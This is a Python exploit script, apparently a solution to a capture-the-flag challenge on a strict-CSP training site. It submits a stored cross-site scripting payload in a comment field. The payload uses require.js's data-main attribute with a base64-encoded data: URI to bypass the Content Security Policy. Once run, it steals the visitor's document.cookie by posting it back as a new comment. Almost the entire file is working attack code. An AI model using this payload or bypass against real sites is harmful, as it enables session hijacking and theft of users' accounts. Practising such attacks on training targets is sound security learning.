import requests
import random
import string

url = "https://strict-csp.training.jinblack.it"

def gen_ran_str(size=15):
	return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

s = requests.Session()

#just a request to arrive to the vulnerable page
r = s.post(url, data={
	'title': gen_ran_str(),
	'location': gen_ran_str(),
	'description': gen_ran_str(),
	'proposals': gen_ran_str()})
new_url = r.url

r = s.post(new_url, data={
	"name": gen_ran_str(),
	# the data-main value of this element will get run by require.js when it is loading
	# the decode scirpt is simple, just creates a comment putting the cookies and submitting it
	"comment": "<script data-main='data:;base64,ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI25hbWUiKS52YWx1ZSA9ICJ3b3chIjsNCmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb21tZW50IikudmFsdWUgPSBkb2N1bWVudC5jb29raWU7DQpkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCJib2R5ID4gZGl2ID4gc21hbGwgPiBmb3JtID4gYnV0dG9uOm50aC1jaGlsZCgyKSIpLmNsaWNrKCk7DQo=' src='require.js'></script>"})

print(r.url)
